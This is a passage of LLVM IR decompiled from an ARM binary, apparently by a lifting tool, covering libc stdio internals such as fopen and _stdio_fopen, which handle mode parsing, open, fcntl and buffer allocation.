  %v1_161fc = add i32 %v4_161f4, 4
  %v2_161fc = inttoptr i32 %v1_161fc to i32*
  %v3_161fc = load i32, i32* %v2_161fc, align 4
  store i32 %v3_161fc, i32* %r1.global-to-local, align 4
  %v1_16200 = add i32 %v2_161f8, 1
  store i32 %v1_16200, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16204 = icmp eq i32 %v3_161fc, 0
  store i32 %v1_16200, i32* %v1_161f8, align 4
  br i1 %v2_16204, label %dec_label_pc_16210, label %dec_label_pc_16270

dec_label_pc_16210:                               ; preds = %dec_label_pc_161e8
  %v0_16210 = load i32, i32* %r1.global-to-local, align 4
  %v1_16210 = load i32, i32* %r0.global-to-local, align 4
  %v2_16210 = add i32 %v1_16210, 8
  %v3_16210 = inttoptr i32 %v2_16210 to i32*
  store i32 %v0_16210, i32* %v3_16210, align 4
  %v0_16214 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16214, i32* @r5, align 4
  br label %dec_label_pc_16218

dec_label_pc_16218:                               ; preds = %dec_label_pc_16248.dec_label_pc_16218_crit_edge, %dec_label_pc_16210
  %v0_16218 = phi i32 [ %v0_16218.pre, %dec_label_pc_16248.dec_label_pc_16218_crit_edge ], [ %v0_16214, %dec_label_pc_16210 ]
  %v1_16218 = inttoptr i32 %v0_16218 to i32*
  %v2_16218 = load i32, i32* %v1_16218, align 4
  store i32 %v2_16218, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16218, i32* %r2.global-to-local, align 4
  %v2_1622464 = load i32, i32* %v1_16218, align 4
  store i32 %v2_1622464, i32* %r3.global-to-local, align 4
  %v3_1622866 = icmp uge i32 %v2_1622464, %v2_16218
  store i1 %v3_1622866, i1* %cpsr_c.global-to-local, align 1
  %v9_1622872 = icmp eq i32 %v2_1622464, %v2_16218
  br i1 %v9_1622872, label %dec_label_pc_16230, label %dec_label_pc_16248

dec_label_pc_16230:                               ; preds = %dec_label_pc_16218, %dec_label_pc_16230.dec_label_pc_16224_crit_edge
  %v0_1623073 = phi i32 [ %v1_16228.pre, %dec_label_pc_16230.dec_label_pc_16224_crit_edge ], [ %v2_16218, %dec_label_pc_16218 ]
  store i32 %v0_1623073, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16240 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16240, label %dec_label_pc_16244, label %dec_label_pc_16230.dec_label_pc_16224_crit_edge

dec_label_pc_16230.dec_label_pc_16224_crit_edge:  ; preds = %dec_label_pc_16230
  %v0_16224.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16228.pre = load i32, i32* @r4, align 4
  %v1_16224 = inttoptr i32 %v0_16224.pre to i32*
  %v2_16224 = load i32, i32* %v1_16224, align 4
  store i32 %v2_16224, i32* %r3.global-to-local, align 4
  %v3_16228 = icmp uge i32 %v2_16224, %v1_16228.pre
  store i1 %v3_16228, i1* %cpsr_c.global-to-local, align 1
  %v9_16228 = icmp eq i32 %v2_16224, %v1_16228.pre
  br i1 %v9_16228, label %dec_label_pc_16230, label %dec_label_pc_16248

dec_label_pc_16244:                               ; preds = %dec_label_pc_16230
  %v0_16244 = load i32, i32* @r4, align 4
  store i32 %v0_16244, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16248

dec_label_pc_16248:                               ; preds = %dec_label_pc_16218, %dec_label_pc_16230.dec_label_pc_16224_crit_edge, %dec_label_pc_16244
  %v0_16250 = phi i32 [ %v0_16244, %dec_label_pc_16244 ], [ %v2_1622464, %dec_label_pc_16218 ], [ %v2_16224, %dec_label_pc_16230.dec_label_pc_16224_crit_edge ]
  %v1_16248 = phi i32 [ %v0_16244, %dec_label_pc_16244 ], [ %v2_16218, %dec_label_pc_16218 ], [ %v1_16228.pre, %dec_label_pc_16230.dec_label_pc_16224_crit_edge ]
  %v3_16248 = icmp uge i32 %v0_16250, %v1_16248
  store i1 %v3_16248, i1* %cpsr_c.global-to-local, align 1
  %v9_16248 = icmp eq i32 %v0_16250, %v1_16248
  br i1 %v9_16248, label %dec_label_pc_16250, label %dec_label_pc_16248.dec_label_pc_16218_crit_edge

dec_label_pc_16248.dec_label_pc_16218_crit_edge:  ; preds = %dec_label_pc_16248
  %v0_16218.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16218

dec_label_pc_16250:                               ; preds = %dec_label_pc_16248
  %v2_16250 = icmp ne i32 %v1_16248, 0
  store i1 %v2_16250, i1* %cpsr_c.global-to-local, align 1
  %v7_16254 = icmp slt i32 %v1_16248, 2
  br i1 %v7_16254, label %dec_label_pc_16270, label %dec_label_pc_16258

dec_label_pc_16258:                               ; preds = %dec_label_pc_16250
  %v0_16258 = load i32, i32* @r5, align 4
  store i32 %v0_16258, i32* %r0.global-to-local, align 4
  %v0_1625c = load i32, i32* %r1.global-to-local, align 4
  %v1_1625c = add i32 %v0_1625c, 129
  store i32 %v1_1625c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16270

dec_label_pc_16270:                               ; preds = %dec_label_pc_161e8, %dec_label_pc_16258, %dec_label_pc_16250
  %v0_16270 = call i32 @_stdio_openlist_dec_use()
  %v0_16274 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_16274, i32* %r0.global-to-local, align 4
  %v2_1627c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_1627c, i32* @r4, align 4
  store i32 %v6_15f64, i32* @r5, align 4
  store i32 %v9_15f64, i32* @r6, align 4
  store i32 %v12_15f64, i32* @r7, align 4
  ret i32 %v0_16274

; uselistorder directives
  uselistorder i32 %v0_16244, { 1, 0, 2 }
  uselistorder i32 %v1_16228.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16218, { 1, 0 }
  uselistorder i32 %v0_161ec, { 1, 0 }
  uselistorder i32 %v0_161d4, { 1, 0, 2 }
  uselistorder i32 %v1_161b8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_161a0, { 1, 0 }
  uselistorder i32 %v0_16158, { 1, 0, 2 }
  uselistorder i32 %v1_1613c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_160cc, { 1, 0, 2 }
  uselistorder i32 %v1_160b0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_160a0, { 1, 0 }
  uselistorder i32 %v0_1605c, { 1, 0, 2 }
  uselistorder i32 %v1_16040.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16020, { 1, 0 }
  uselistorder i32 %v1_15fac.pre, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 5, 4, 43, 6, 7, 8, 9, 10, 12, 11, 44, 13, 16, 14, 15, 17, 19, 18, 45, 20, 21, 22, 23, 24, 26, 25, 46, 27, 28, 29, 30, 32, 31, 0, 33, 34, 35, 36, 37, 38, 39, 41, 40, 1, 42 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 25, 21, 22, 0, 23, 24, 26, 1 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 3, 4, 28, 29, 5, 6, 7, 30, 31, 8, 9, 10, 11, 32, 33, 12, 13, 14, 15, 16, 34, 35, 17, 18, 20, 19, 0, 21, 22, 23, 25, 24, 1, 26, 27 }
  uselistorder i32 (i32)* @__GI___libc_close, { 29, 27, 26, 33, 32, 25, 31, 30, 24, 23, 28, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_16270, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16248, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16230, { 1, 0 }
  uselistorder label %dec_label_pc_161e8, { 1, 0 }
  uselistorder label %bb51, { 1, 0 }
  uselistorder label %dec_label_pc_161d8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_161c0, { 1, 0 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %dec_label_pc_16184, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1615c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16144, { 1, 0 }
  uselistorder label %dec_label_pc_160f8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_160d0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_160b8, { 1, 0 }
  uselistorder label %dec_label_pc_16070, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_16060, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16048, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_15fe8, { 1, 0 }
  uselistorder label %dec_label_pc_15fdc, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %dec_label_pc_15fcc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15fb4, { 1, 0 }
}

define i32 @function_16288(i32 %arg1) local_unnamed_addr {
dec_label_pc_16288:
  %v0_16288 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16288, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_16288
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_16288, %bb
  %v10_16290 = phi i32 [ %arg1, %dec_label_pc_16288 ], [ 0, %bb ]
  ret i32 %v10_16290

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI_fopen() local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_162a4 = call i32 @_stdio_fopen()
  ret i32 %v0_162a4
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_162b4 = load i32, i32* @r4, align 4
  store i32 %v3_162b4, i32* %stack_var_-24, align 4
  %v6_162b4 = load i32, i32* @r5, align 4
  %v9_162b4 = load i32, i32* @r6, align 4
  %v12_162b4 = load i32, i32* @r7, align 4
  %v15_162b4 = load i32, i32* @r8, align 4
  %v0_162b8 = load i32, i32* @r1, align 4
  %v1_162b8 = inttoptr i32 %v0_162b8 to i8*
  %v2_162b8 = load i8, i8* %v1_162b8, align 1
  %v2_162c0 = icmp ugt i8 %v2_162b8, 113
  store i1 %v2_162c0, i1* %cpsr_c.global-to-local, align 1
  %v7_162c0 = icmp eq i8 %v2_162b8, 114
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* @r8, align 4
  %v0_162cc = load i32, i32* @r0, align 4
  store i32 %v0_162cc, i32* @r7, align 4
  %v0_162d0 = load i32, i32* @r2, align 4
  store i32 %v0_162d0, i32* @r5, align 4
  %v0_162d4 = load i32, i32* @r3, align 4
  store i32 %v0_162d4, i32* @r6, align 4
  br i1 %v7_162c0, label %dec_label_pc_16328, label %dec_label_pc_162dc

dec_label_pc_162dc:                               ; preds = %entry
  %v2_162dc = icmp ugt i8 %v2_162b8, 118
  store i1 %v2_162dc, i1* %cpsr_c.global-to-local, align 1
  %v7_162dc = icmp eq i8 %v2_162b8, 119
  br i1 %v7_162dc, label %bb, label %dec_label_pc_162e8

bb:                                               ; preds = %dec_label_pc_162dc
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_1632c

dec_label_pc_162e8:                               ; preds = %dec_label_pc_162dc
  %v2_162e8 = icmp ugt i8 %v2_162b8, 96
  store i1 %v2_162e8, i1* %cpsr_c.global-to-local, align 1
  %v7_162e8 = icmp eq i8 %v2_162b8, 97
  br i1 %v7_162e8, label %bb49, label %dec_label_pc_162f4

bb49:                                             ; preds = %dec_label_pc_162e8
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_1632c

dec_label_pc_162f4:                               ; preds = %dec_label_pc_162e8, %dec_label_pc_163c4, %dec_label_pc_16398
  store i32 49040, i32* %r2.global-to-local, align 4
  %v0_162f8 = call i32 @__aeabi_read_tp()
  store i32 %v0_162f8, i32* %r0.global-to-local, align 4
  %v3_162fc = load i16, i16* @global_var_22294.357, align 2
  %v4_162fc = sext i16 %v3_162fc to i32
  store i32 %v4_162fc, i32* %r2.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_16304 = load i32, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16304 = icmp eq i32 %v0_16304, 0
  %v3_16308 = add i32 %v4_162fc, %v0_162f8
  %v4_16308 = inttoptr i32 %v3_16308 to i32*
  store i32 22, i32* %v4_16308, align 4
  br i1 %v2_16304, label %dec_label_pc_166cc, label %dec_label_pc_16310

dec_label_pc_16310:                               ; preds = %dec_label_pc_163e8._crit_edge, %dec_label_pc_162f4
  %v0_16310 = load i32, i32* @r5, align 4
  %v1_16310 = inttoptr i32 %v0_16310 to i16*
  %v2_16310 = load i16, i16* %v1_16310, align 2
  %v3_16310 = zext i16 %v2_16310 to i32
  store i32 %v3_16310, i32* %r3.global-to-local, align 4
  %v1_16314 = and i32 %v3_16310, 8192
  %v2_16314 = icmp eq i32 %v1_16314, 0
  br i1 %v2_16314, label %dec_label_pc_166cc, label %dec_label_pc_1631c

dec_label_pc_1631c:                               ; preds = %dec_label_pc_16310
  store i32 %v0_16310, i32* @r0, align 4
  %v0_16320 = call i32 @free()
  store i32 %v0_16320, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_166cc

dec_label_pc_16328:                               ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_1632c

dec_label_pc_1632c:                               ; preds = %bb, %bb49, %dec_label_pc_16328
  %v1_16344 = phi i32 [ 1089, %bb49 ], [ 577, %bb ], [ 1, %dec_label_pc_16328 ]
  %v1_1632c = add i32 %v0_162b8, 1
  %v2_1632c = inttoptr i32 %v1_1632c to i8*
  %v3_1632c = load i8, i8* %v2_1632c, align 1
  %v2_16330 = icmp ugt i8 %v3_1632c, 97
  store i1 %v2_16330, i1* %cpsr_c.global-to-local, align 1
  %v7_16330 = icmp eq i8 %v3_1632c, 98
  %v1_1632c.v0_162b8 = select i1 %v7_16330, i32 %v1_1632c, i32 %v0_162b8
  store i32 %v1_1632c.v0_162b8, i32* %r3.global-to-local, align 4
  %v1_1633c = add i32 %v1_1632c.v0_162b8, 1
  %v2_1633c = inttoptr i32 %v1_1633c to i8*
  %v3_1633c = load i8, i8* %v2_1633c, align 1
  %v4_1633c = zext i8 %v3_1633c to i32
  store i32 %v4_1633c, i32* @r3, align 4
  %v2_16340 = icmp ugt i8 %v3_1633c, 42
  store i1 %v2_16340, i1* %cpsr_c.global-to-local, align 1
  %v7_16340 = icmp eq i8 %v3_1633c, 43
  br i1 %v7_16340, label %bb52, label %.thread3

bb52:                                             ; preds = %dec_label_pc_1632c
  store i32 %v1_16344, i32* @r3, align 4
  %v2_16348 = add nuw nsw i32 %v1_16344, 1
  store i32 %v2_16348, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1632c, %bb52
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1634c = icmp eq i32 %v0_162d0, 0
  br i1 %v2_1634c, label %dec_label_pc_16354, label %dec_label_pc_16390

dec_label_pc_16354:                               ; preds = %.thread3
  store i32 68, i32* @r0, align 4
  %v0_16358 = call i32 @malloc()
  store i32 %v0_16358, i32* %r0.global-to-local, align 4
  store i32 %v0_16358, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_1635c = icmp eq i32 %v0_16358, 0
  br i1 %v3_1635c, label %dec_label_pc_166d0, label %dec_label_pc_16364

dec_label_pc_16364:                               ; preds = %dec_label_pc_16354
  %v0_16368 = load i32, i32* @r8, align 4
  %v2_16368 = add i32 %v0_16368, -33136
  store i32 %v2_16368, i32* %r3.global-to-local, align 4
  %v1_1636c = inttoptr i32 %v2_16368 to i32*
  %v2_1636c = load i32, i32* %v1_1636c, align 4
  store i32 %v2_1636c, i32* %r0.global-to-local, align 4
  %v3_1636c = add i32 %v0_16368, -33132
  %v4_1636c = inttoptr i32 %v3_1636c to i32*
  %v5_1636c = load i32, i32* %v4_1636c, align 4
  store i32 %v5_1636c, i32* @r1, align 4
  %v6_1636c = add i32 %v0_16368, -33128
  %v7_1636c = inttoptr i32 %v6_1636c to i32*
  %v8_1636c = load i32, i32* %v7_1636c, align 4
  store i32 %v8_1636c, i32* %r2.global-to-local, align 4
  %v2_16378 = add i32 %v0_16358, 8
  %v3_16378 = inttoptr i32 %v2_16378 to i32*
  store i32 0, i32* %v3_16378, align 4
  %v2_16380 = load i32, i32* @r5, align 4
  %v3_16380 = inttoptr i32 %v2_16380 to i16*
  store i16 8192, i16* %v3_16380, align 2
  %v2_16384 = load i32, i32* %r0.global-to-local, align 4
  %v0_16388 = load i32, i32* @r5, align 4
  %v1_16388 = add i32 %v0_16388, 56
  store i32 %v1_16388, i32* @r3, align 4
  %v1_1638c = inttoptr i32 %v1_16388 to i32*
  store i32 %v2_16384, i32* %v1_1638c, align 4
  %v3_1638c = add i32 %v0_16388, 60
  %v4_1638c = inttoptr i32 %v3_1638c to i32*
  %v5_1638c = load i32, i32* @r1, align 4
  store i32 %v5_1638c, i32* %v4_1638c, align 4
  %v6_1638c = add i32 %v0_16388, 64
  %v7_1638c = inttoptr i32 %v6_1638c to i32*
  %v8_1638c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1638c, i32* %v7_1638c, align 4
  %v0_16390.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_16390

dec_label_pc_16390:                               ; preds = %.thread3, %dec_label_pc_16364
  %v0_163e8 = phi i32 [ %v0_162d4, %.thread3 ], [ %v0_16390.pre, %dec_label_pc_16364 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_16390 = icmp slt i32 %v0_163e8, 0
  br i1 %v1_16390, label %dec_label_pc_163e8, label %dec_label_pc_16398

dec_label_pc_16398:                               ; preds = %dec_label_pc_16390
  %v0_1639c = load i32, i32* @r4, align 4
  %v2_1639c = and i32 %v0_1639c, 131075
  %v1_163a0 = add nuw nsw i32 %v2_1639c, 1
  store i32 %v1_163a0, i32* %r2.global-to-local, align 4
  %v0_163a4 = load i32, i32* @r7, align 4
  %v1_163a4 = add i32 %v0_163a4, 1
  %v2_163a8 = and i32 %v1_163a4, %v1_163a0
  store i32 %v2_163a8, i32* %r3.global-to-local, align 4
  %v3_163ac = icmp uge i32 %v2_163a8, %v1_163a0
  store i1 %v3_163ac, i1* %cpsr_c.global-to-local, align 1
  %v9_163ac = icmp eq i32 %v2_163a8, %v1_163a0
  %v1_163b0 = load i32, i32* @r5, align 4
  %v2_163b0 = add i32 %v1_163b0, 4
  %v3_163b0 = inttoptr i32 %v2_163b0 to i32*
  store i32 %v0_163e8, i32* %v3_163b0, align 4
  br i1 %v9_163ac, label %dec_label_pc_163b8, label %dec_label_pc_162f4

dec_label_pc_163b8:                               ; preds = %dec_label_pc_16398
  %v0_163b8 = load i32, i32* @r4, align 4
  %v1_163b8 = load i32, i32* @r7, align 4
  %v2_163b8 = sub i32 -1, %v1_163b8
  %v3_163b8 = and i32 %v0_163b8, %v2_163b8
  store i32 %v3_163b8, i32* @r3, align 4
  %v1_163bc = and i32 %v3_163b8, 1024
  %v2_163bc = icmp eq i32 %v1_163bc, 0
  br i1 %v2_163bc, label %dec_label_pc_163dc, label %dec_label_pc_163c4

dec_label_pc_163c4:                               ; preds = %dec_label_pc_163b8
  %v0_163c4 = load i32, i32* @r6, align 4
  store i32 %v0_163c4, i32* %r0.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_163d0 = call i32 @__libc_fcntl(i32 %v0_163c4, i32 4)
  store i32 %v2_163d0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_163d4 = icmp eq i32 %v2_163d0, 0
  br i1 %v2_163d4, label %dec_label_pc_163c4.dec_label_pc_163dc_crit_edge, label %dec_label_pc_162f4

dec_label_pc_163c4.dec_label_pc_163dc_crit_edge:  ; preds = %dec_label_pc_163c4
  %v0_163dc.pre = load i32, i32* @r7, align 4
  %v0_163e0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_163dc

dec_label_pc_163dc:                               ; preds = %dec_label_pc_163c4.dec_label_pc_163dc_crit_edge, %dec_label_pc_163b8
  %v0_163e0 = phi i32 [ %v0_163e0.pre, %dec_label_pc_163c4.dec_label_pc_163dc_crit_edge ], [ %v0_163b8, %dec_label_pc_163b8 ]
  %v0_163dc = phi i32 [ %v0_163dc.pre, %dec_label_pc_163c4.dec_label_pc_163dc_crit_edge ], [ %v1_163b8, %dec_label_pc_163b8 ]
  %v1_163dc = and i32 %v0_163dc, 131072
  store i32 %v1_163dc, i32* %r3.global-to-local, align 4
  %v2_163e0 = or i32 %v1_163dc, %v0_163e0
  store i32 %v2_163e0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1640c

dec_label_pc_163e8:                               ; preds = %dec_label_pc_16390
  %v2_163e8 = icmp eq i32 %v0_163e8, -1
  store i1 %v2_163e8, i1* %cpsr_c.global-to-local, align 1
  %v7_163e8 = icmp eq i32 %v0_163e8, -1
  %v0_163f4.pre = load i32, i32* @r4, align 4
  br i1 %v7_163e8, label %dec_label_pc_163e8._crit_edge, label %bb53

bb53:                                             ; preds = %dec_label_pc_163e8
  %v2_163ec = or i32 %v0_163f4.pre, 131072
  store i32 %v2_163ec, i32* @r4, align 4
  br label %dec_label_pc_163e8._crit_edge

dec_label_pc_163e8._crit_edge:                    ; preds = %dec_label_pc_163e8, %bb53
  %v0_163f4 = phi i32 [ %v2_163ec, %bb53 ], [ %v0_163f4.pre, %dec_label_pc_163e8 ]
  %v0_163f0 = load i32, i32* @r7, align 4
  store i32 %v0_163f0, i32* %r0.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_163fc = call i32 @__libc_open(i32 %v0_163f0, i32 %v0_163f4)
  store i32 %v2_163fc, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_16400 = icmp slt i32 %v2_163fc, 0
  %v1_16404 = load i32, i32* @r5, align 4
  %v2_16404 = add i32 %v1_16404, 4
  %v3_16404 = inttoptr i32 %v2_16404 to i32*
  store i32 %v2_163fc, i32* %v3_16404, align 4
  br i1 %v1_16400, label %dec_label_pc_16310, label %.dec_label_pc_1640c_crit_edge

.dec_label_pc_1640c_crit_edge:                    ; preds = %dec_label_pc_163e8._crit_edge
  %v0_16410.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1640c

dec_label_pc_1640c:                               ; preds = %.dec_label_pc_1640c_crit_edge, %dec_label_pc_163dc
  %v0_16428 = phi i32 [ %v0_16410.pre, %.dec_label_pc_1640c_crit_edge ], [ %v2_163e0, %dec_label_pc_163dc ]
  %v0_1640c = load i32, i32* @r5, align 4
  %v1_1640c = inttoptr i32 %v0_1640c to i16*
  %v2_1640c = load i16, i16* %v1_1640c, align 2
  %v3_1640c = zext i16 %v2_1640c to i32
  %v1_16410 = urem i32 %v0_16428, 4
  %v1_16414 = and i32 %v0_16428, 1024
  %v1_16418 = and i32 %v3_1640c, 8192
  %v1_1641c = add nuw nsw i32 %v1_16410, 1
  %v2_16420 = or i32 %v1_16418, %v1_16414
  store i32 %v2_16420, i32* %r3.global-to-local, align 4
  %v1_16424 = xor i32 %v1_1641c, 3
  %v1_16428 = and i32 %v0_16428, 131072
  store i32 %v1_16428, i32* %r2.global-to-local, align 4
  %v2_16428 = icmp eq i32 %v1_16428, 0
  %v1_1642c = add i32 %v0_1640c, 4
  %v2_1642c = inttoptr i32 %v1_1642c to i32*
  %v3_1642c = load i32, i32* %v2_1642c, align 4
  store i32 %v3_1642c, i32* @r4, align 4
  br i1 %v2_16428, label %bb55, label %bb54

bb54:                                             ; preds = %dec_label_pc_1640c
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb55

bb55:                                             ; preds = %dec_label_pc_1640c, %bb54
  %v0_16438 = phi i32 [ 0, %dec_label_pc_1640c ], [ 32768, %bb54 ]
  %v4_16434 = mul nuw nsw i32 %v1_16424, 16
  %v5_16434 = or i32 %v2_16420, %v4_16434
  store i32 %v5_16434, i32* %r3.global-to-local, align 4
  %v2_16438 = or i32 %v0_16438, %v5_16434
  store i32 %v2_16438, i32* %r2.global-to-local, align 4
  %v2_1643c = icmp ugt i32 %v3_1642c, 2147483646
  store i1 %v2_1643c, i1* %cpsr_c.global-to-local, align 1
  %v8_1643c = icmp eq i32 %v3_1642c, 2147483647
  %v1_16440 = trunc i32 %v2_16438 to i16
  store i16 %v1_16440, i16* %v1_1640c, align 2
  br i1 %v8_1643c, label %dec_label_pc_16480, label %dec_label_pc_16448

dec_label_pc_16448:                               ; preds = %bb55
  store i32 48700, i32* %r3.global-to-local, align 4
  %v0_1644c = call i32 @__aeabi_read_tp()
  %v3_16450 = load i16, i16* @global_var_22294.357, align 2
  %v4_16450 = sext i16 %v3_16450 to i32
  store i32 %v4_16450, i32* @r3, align 4
  store i32 %v0_1644c, i32* @r6, align 4
  %v0_16458 = load i32, i32* @r4, align 4
  store i32 %v0_16458, i32* @r0, align 4
  %v2_1645c = add i32 %v4_16450, %v0_1644c
  %v3_1645c = inttoptr i32 %v2_1645c to i32*
  %v4_1645c = load i32, i32* %v3_1645c, align 4
  store i32 %v4_1645c, i32* @r4, align 4
  %v1_16460 = call i32 @isatty(i32 %v0_16458)
  store i32 %v1_16460, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16464 = icmp eq i32 %v1_16460, 0
  br i1 %v2_16464, label %.thread5, label %bb56

bb56:                                             ; preds = %dec_label_pc_16448
  %v1_16468 = load i32, i32* @r5, align 4
  %v2_16468 = inttoptr i32 %v1_16468 to i16*
  %v3_16468 = load i16, i16* %v2_16468, align 2
  %v4_16468 = zext i16 %v3_16468 to i32
  %v2_1646c = or i32 %v4_16468, 256
  store i32 %v2_1646c, i32* %r3.global-to-local, align 4
  %v2_16470 = trunc i32 %v2_1646c to i16
  store i16 %v2_16470, i16* %v2_16468, align 2
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_16448, %bb56
  %v3_16478 = load i16, i16* @global_var_22294.357, align 2
  %v4_16478 = sext i16 %v3_16478 to i32
  store i32 %v4_16478, i32* %r3.global-to-local, align 4
  %v0_1647c = load i32, i32* @r4, align 4
  %v1_1647c = load i32, i32* @r6, align 4
  %v3_1647c = add i32 %v1_1647c, %v4_16478
  %v4_1647c = inttoptr i32 %v3_1647c to i32*
  store i32 %v0_1647c, i32* %v4_1647c, align 4
  br label %dec_label_pc_16480

dec_label_pc_16480:                               ; preds = %bb55, %.thread5
  %v0_16480 = load i32, i32* @r5, align 4
  %v1_16480 = add i32 %v0_16480, 8
  %v2_16480 = inttoptr i32 %v1_16480 to i32*
  %v3_16480 = load i32, i32* %v2_16480, align 4
  store i32 %v3_16480, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16484 = icmp eq i32 %v3_16480, 0
  br i1 %v2_16484, label %dec_label_pc_1648c, label %bb57

dec_label_pc_1648c:                               ; preds = %dec_label_pc_16480
  store i32 4096, i32* @r0, align 4
  %v0_16490 = call i32 @malloc()
  store i32 %v0_16490, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16494 = icmp eq i32 %v0_16490, 0
  %v1_164a4.pre = load i32, i32* @r5, align 4
  br i1 %v2_16494, label %.thread9, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1648c
  %v2_16498 = inttoptr i32 %v1_164a4.pre to i16*
  %v3_16498 = load i16, i16* %v2_16498, align 2
  %v4_16498 = zext i16 %v3_16498 to i32
  %v2_1649c = add i32 %v0_16490, 4096
  store i32 %v2_1649c, i32* %r2.global-to-local, align 4
  %v2_164a0 = or i32 %v4_16498, 16384
  store i32 %v2_164a0, i32* %r3.global-to-local, align 4
  %v2_164a4 = add i32 %v1_164a4.pre, 8
  %v3_164a4 = inttoptr i32 %v2_164a4 to i32*
  store i32 %v0_16490, i32* %v3_164a4, align 4
  %v1_164a8 = load i32, i32* %r2.global-to-local, align 4
  %v2_164a8 = load i32, i32* @r5, align 4
  %v3_164a8 = add i32 %v2_164a8, 12
  %v4_164a8 = inttoptr i32 %v3_164a8 to i32*
  store i32 %v1_164a8, i32* %v4_164a8, align 4
  %v1_164ac = load i32, i32* %r3.global-to-local, align 4
  %v2_164ac = trunc i32 %v1_164ac to i16
  %v3_164ac = load i32, i32* @r5, align 4
  %v4_164ac = inttoptr i32 %v3_164ac to i16*
  store i16 %v2_164ac, i16* %v4_164ac, align 2
  br label %bb57

.thread9:                                         ; preds = %dec_label_pc_1648c
  %v2_164a437 = add i32 %v1_164a4.pre, 8
  %v3_164a438 = inttoptr i32 %v2_164a437 to i32*
  store i32 0, i32* %v3_164a438, align 4
  %v2_164b0 = load i32, i32* @r5, align 4
  %v3_164b0 = add i32 %v2_164b0, 12
  %v4_164b0 = inttoptr i32 %v3_164b0 to i32*
  store i32 0, i32* %v4_164b0, align 4
  br label %bb57

